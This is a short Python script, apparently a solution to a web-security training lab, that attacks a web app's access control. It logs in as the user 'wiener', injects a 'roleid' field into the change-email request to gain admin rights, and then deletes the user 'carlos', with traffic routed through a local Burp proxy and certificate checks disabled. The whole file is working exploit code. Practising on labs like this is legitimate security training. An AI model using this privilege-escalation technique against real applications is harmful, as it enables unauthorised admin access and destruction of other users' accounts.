import requests
import urllib3
import sys
from bs4 import BeautifulSoup

# now we are going to disable warnings>
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#making proxies because all the request we want to sent the burp
proxies={'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def delete_user(s,url):
    #login as wiener
    login_url=url + "/login"
    data_login={'username':'wiener','password':'peter'}
   #now we have login page usrname and password now we will perform a request
    r=s.post(login_url,data=data_login,verify=False,proxies=proxies)
    #now we will set a response of a variable
    res=r.text #setting up response of a variable
    if "Log out" in res:
        print("(+) Successfully logged in as user wiener")
        
        #change the roleid of a user
        change_email=url + "/my-account/change-email"
        data_role_change={"email":"hello@gmail.com","roleid":2}
        #now we have endpoint of change_email and roleid now i will send a request
        r=s.post(change_email,json=data_role_change,verify=False,proxies=proxies)
        res=r.text
        if "Admin" in res:
            print("(+)Successfully changed the roleid")
            #I will delete a user here
            delete_carlos=url + "/admin/delete?username=carlos"
            r=s.get(delete_carlos,verify=False,proxies=proxies)
            #ava yadi we got statuscode=200 then the user carlos must be deleted
            if r.status_code==200:
                print("(+)Successfully deleted the user carlos")
            else:
                print("(-)User carlos is not been deleted")    
                sys.exit(-1)
        else:
            print("(-)Failed to change the roleid")   
            sys.exit(-1) #since I am unable to chage the role id i will exit the program 
    else:
        print("(-)Could not login as user wiener")   
        sys.exit(-1) 
def main():
    if len(sys.argv)!=2:
        print("(+) Usage %s <url>" % sys.argv[0])
        print("(+) Example %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    else:
        s=requests.Session()
        url=sys.argv[1]
        delete_user(s,url) #the delete_user fn is going to do all the thing


if __name__=="__main__":
    main()

